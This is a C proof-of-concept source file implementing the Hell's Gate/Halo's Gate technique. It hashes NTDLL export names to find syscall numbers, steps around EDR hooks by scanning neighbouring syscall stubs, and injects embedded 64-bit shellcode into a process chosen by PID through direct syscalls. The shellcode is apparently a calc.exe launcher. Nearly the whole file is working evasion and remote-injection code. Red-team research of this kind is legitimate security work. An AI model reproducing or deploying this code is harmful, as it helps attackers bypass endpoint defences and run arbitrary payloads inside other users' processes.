/*Credits   : This POC is inspired by Paul Laîné(@am0nsec),smelly__vx (@RtlMateusz)(HellsGate_VX technique),
            : Reenz0h from @SEKTOR7net
  Refrences : https://blog.sektor7.net/#!res/2021/halosgate.md
            : https://rioasmara.com/2022/03/09/hellgate-technique-on-av-bypass/
            : https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf
            : https://github.com/am0nsec/HellsGate/tree/master/HellsGate 
  Overview  : checkout README.md         
*/


#pragma once
#include <Windows.h>
#include "structs.h"

#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

#define UP -32
#define DOWN 32


/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtOpenProcess;
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
    _In_ PVOID                     pModuleBase,
    _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
    _In_ PVOID pModuleBase,
    _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
    _In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
    _In_ PVX_TABLE pVxTable,
    _In_ DWORD PID
);


/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();






INT wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        printf("usage: Hellsgate.exe <PID>\n", argv[0]);
        return EXIT_FAILURE;
    }
    DWORD PID = _wtoi(argv[1]);
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;

    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

    VX_TABLE Table = { 0 };

    Table.NtOpenProcess.dwHash = 0x718cca1f5291f6e7;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
        return 0x1;

    Payload(&Table,PID);
    return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        //djb2 is the function to hash the ntdll API function name
        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;


            /* This loop checks the Opcodes and  extracting a 16-bit system call identifier from the function's
              instructions, and storing it in wSystemCall.
              The process makes use of little-endian byte ordering when combining the two extracted bytes.

              First opcodes should be :
                 MOV R10, RCX
                 MOV RAX, <syscall>
            */


            if (*((PBYTE)pFunctionAddress) == 0x4c
                && *((PBYTE)pFunctionAddress + 1) == 0x8b
                && *((PBYTE)pFunctionAddress + 2) == 0xd1
                && *((PBYTE)pFunctionAddress + 3) == 0xb8
                && *((PBYTE)pFunctionAddress + 6) == 0x00
                && *((PBYTE)pFunctionAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFunctionAddress + 5);
                BYTE low = *((PBYTE)pFunctionAddress + 4);
                pVxTableEntry->wSystemCall = (high << 8) | low;

                return TRUE;
            }

            /* If function is hooked it try to find clean syscall in neighbourhood
              This 2nd loop starts with 0xe9 JMP instruction and again checking same opcode but this time DOWN 32byte
            */

            if (*((PBYTE)pFunctionAddress) == 0xe9) {

                for (WORD idx = 1; idx <= 500; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                        pVxTableEntry->wSystemCall = (high << 8) | low - idx;
                        printf("API %s Down how many times : %d \n", pczFunctionName, idx);
                        return TRUE;
                    }
                    /*   This 3rd loop for UP -32bytes  */

                    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                        pVxTableEntry->wSystemCall = (high << 8) | low + idx;
                        printf("API %s Up how many times : %d \n", pczFunctionName, idx);
                        return TRUE;
                    }

                }

                return FALSE;
            }
        }
    }

    return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable,DWORD PID) {
    NTSTATUS status = 0x00000000;

    // calc.exe shellcode - 64-bit
    unsigned char payload[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0,
       0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56,
       0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
       0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a,
       0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
       0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
       0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0,
       0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48,
       0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01,
       0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
       0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d,
       0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08,
       0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01,
       0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01,
       0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58,
       0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec,
       0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12,
       0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41,
       0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a,
       0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28,
       0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13,
       0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d,
       0x64, 0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c,
       0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    };
       
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = sizeof(payload);
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    SIZE_T bytesWritten = 0;
    CLIENT_ID CID = { (HANDLE)PID ,0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA),0 };

    //Open Process handle 

    HellsGate(pVxTable->NtOpenProcess.wSystemCall);
    status = HellDescent(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);

    printf("Table address vx_tab: %p\n HellsGate Assembly function address : %p\n HellDescent Assembly function address : %p\n", pVxTable, HellsGate, HellDescent); getchar();

    //Allocate Memory region

    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    printf("sc: %p | sc_mem: %p\n", payload, lpAddress); getchar();

    //Write memory 

    HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, lpAddress, payload, sizeof(payload), &bytesWritten);

    // Change page permissions
    ULONG ulOldProtect = 0;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    printf("Start the payload injection\n"); getchar();

    // Create thread
    
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    status = HellDescent(&hThread,THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    printf("Exit?\n");
    getchar();

    // Wait for 1 seconds
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hThread, FALSE, &Timeout);

    return TRUE;
}

